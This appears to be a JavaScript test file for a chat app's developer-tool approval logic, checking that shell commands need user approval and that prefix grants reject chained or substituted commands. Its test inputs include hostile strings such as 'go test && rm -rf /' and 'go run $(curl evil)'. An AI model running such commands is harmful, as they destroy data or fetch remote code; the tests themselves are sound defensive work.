import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { test } from 'node:test';
import { moduleURL } from './typescript-module.mjs';

const developer = await import(await moduleURL(new URL('../src/lib/helper/chat-developer.ts', import.meta.url)));
const chatSource = await readFile(new URL('../src/pages/Chat.svelte', import.meta.url), 'utf8');

test('shell commands ask unless a standing approval covers them', () => {
  assert.equal(developer.developerCallNeedsApproval('dev_read_file', { path: 'a' }, []), false);
  assert.equal(developer.developerCallNeedsApproval('dev_edit_file', { path: 'a' }, []), false, 'edits run and show a diff');
  assert.equal(developer.developerCallNeedsApproval('dev_bash', { command: 'ls' }, []), true);
  assert.equal(developer.developerCallNeedsApproval('dev_bash_kill', { job_id: 'x' }, ['ls *']), true, 'stopping a job always asks');
  assert.equal(developer.developerCallNeedsApproval('dev_bash', { command: 'go test ./...' }, ['go *']), false);
});

test('a prefix approval never covers a chained or substituted command', () => {
  assert.equal(developer.developerApprovalFor('go test ./...'), 'go *');
  assert.equal(developer.developerApprovalFor('$(curl x)'), '$(curl x)');
  const grants = ['go *'];
  for (const [command, want] of [
    ['go test ./...', true], ['go', true], ['gofmt -w .', false],
    ['go test && rm -rf /', false], ['go run $(curl evil)', false], ['go build | tee log', false], ['go test\nrm x', false],
  ]) assert.equal(developer.developerCommandApproved(grants, command), want, command);
  assert.equal(developer.developerCommandApproved(['npm run build && npm test'], 'npm run build && npm test'), true, 'an exact grant matches only itself');
});

test('stored results keep the diff for the page and round-trip', () => {
  const stored = developer.developerResultText({ output: 'edited a.md', project: 'notes', changed: ['a.md'], diff: '+x\n-y', diff_truncated: true });
  const view = developer.parseDeveloperResult(stored);
  assert.equal(view.text, 'edited a.md');
  assert.deepEqual([view.project, view.changed, view.diff, view.truncated], ['notes', ['a.md'], '+x\n-y', true]);
  assert.equal(developer.parseDeveloperResult('plain output').text, 'plain output');
  assert.match(developer.developerResultText({ output: '', error: 'boom' }), /^Error: boom/);
});

test('the system prompt names the project and that pushing is not a tool', () => {
  assert.match(developer.developerSystemPrompt('vault'), /"vault" \(\/workspace\/vault\)/);
  assert.match(developer.developerSystemPrompt(''), /whole space/);
  assert.match(developer.developerSystemPrompt('x'), /Pushing is not a tool/);
});

test('Chats wires the Developer Space source, approval card and diff view', () => {
  assert.match(chatSource, /developer: \(_, args\) => executeDeveloperTool\(tc, args, turn\)/);
  assert.match(chatSource, /newSourceMap\[tool\.name\] = \{ type: 'developer' \}/);
  assert.match(chatSource, /\{@render developerApprovalPrompt\(pendingDeveloperApproval\)\}/);
  assert.match(chatSource, /\{@render developerChanges\(parseDeveloperResult\(/);
  // Project and approvals belong to the conversation, never to presets.
  assert.match(chatSource, /developerProject \? \{ developer_project: developerProject \}/);
  assert.match(chatSource, /developer_approvals: \[\.\.\.developerApprovals\]/);
});
